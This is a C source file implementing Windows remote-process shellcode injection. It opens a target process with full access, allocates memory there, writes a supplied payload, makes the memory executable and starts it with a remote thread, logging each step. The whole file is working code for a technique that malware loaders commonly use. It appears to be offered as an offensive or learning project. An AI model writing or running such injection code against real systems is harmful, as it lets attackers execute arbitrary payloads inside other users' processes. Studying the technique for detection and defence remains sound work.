#include "injection.h"

//--------------------------------------------------------------------------------------------------------------------

VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD ErrorStatus
        ) {

    if (NULL == FunctionName || 0 == ErrorStatus) {
        WARN("either you didn't supply a function name"
                "or the function actually returned successfully");
    }

    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorStatus);
    return;

}

//--------------------------------------------------------------------------------------------------------------------

BOOL ShellcodeInjection(
        _In_ DWORD ProcessId,
        _In_ CONST PBYTE Payload,
        _In_ SIZE_T PayloadSize
        ) {

    BOOL   STATE         = TRUE;
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle  = NULL;
    PVOID  RemoteBuffer  = NULL;
    DWORD  OldProtection = 0;

    if (NULL == Payload || 0 == PayloadSize) {
        WARN("Payload's not set. exiting...");
        return FALSE;
    }

    INFO("trying to get a handle on the process (%ld)...", ProcessId);
    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
    if (NULL == ProcessHandle){
        PrettyFormat("OpenProcess", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got a handle on the process!", ProcessHandle);

    RemoteBuffer = VirtualAllocEx(
            ProcessHandle, 
            NULL,
            PayloadSize,
            (MEM_RESERVE | MEM_COMMIT),
            PAGE_READWRITE
            );
    if (NULL == RemoteBuffer) {
        PrettyFormat("VirtualAllocEx", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a buffer with PAGE_READWRITE [RW-] permissions!", RemoteBuffer);

    if (!WriteProcessMemory(
                ProcessHandle,
                RemoteBuffer,
                Payload,
                PayloadSize,
                0
                )) {
        PrettyFormat("WriteProcessMemory", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    /* r/masterhacker */
    for (size_t i = 0; i <= PayloadSize; i++) {
        PROGRESS("[0x%p] [RW-] [%zu/%zu] writing Payload bytes to the allocated buffer...", 
                RemoteBuffer, 
                i, 
                PayloadSize
                );
    }
    (void)puts("");
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer", RemoteBuffer, PayloadSize);

    if (!VirtualProtectEx(
                ProcessHandle,
                RemoteBuffer,
                PayloadSize,
                PAGE_EXECUTE_READ,
                &OldProtection
                )) {
        PrettyFormat("VirtualProtect", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed buffer's page protection to PAGE_EXECUTE_READ [R-X]",
            RemoteBuffer);

    ThreadHandle = CreateRemoteThreadEx(
            ProcessHandle,
            NULL,
            0,
            (PTHREAD_START_ROUTINE)RemoteBuffer, 
            NULL,
            0,
            0,
            0);
    if (NULL == ThreadHandle) {
        PrettyFormat("CreateRemoteThreadEx", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] thread created! waiting for it to finish its execution...", ThreadHandle);

    WaitForSingleObject(ThreadHandle, INFINITE);
    INFO("[0x%p] thread finished execution, beginning cleanup...", ThreadHandle);

CLEANUP:

    INFO("beginning cleanup...");
    if (ThreadHandle) {
        CloseHandle(ThreadHandle);
        INFO("[0x%p] closed thread handle", ThreadHandle);
    }

    if (ProcessHandle) {
        CloseHandle(ProcessHandle);
        INFO("[0x%p] closed process handle", ProcessHandle);
    }

    if (RemoteBuffer) {
        VirtualFree(RemoteBuffer, 0, MEM_RELEASE);
        INFO("[0x%p] remote buffer freed", RemoteBuffer);
    }

    return STATE;

}

//--------------------------------------------------------------------------------------------------------------------
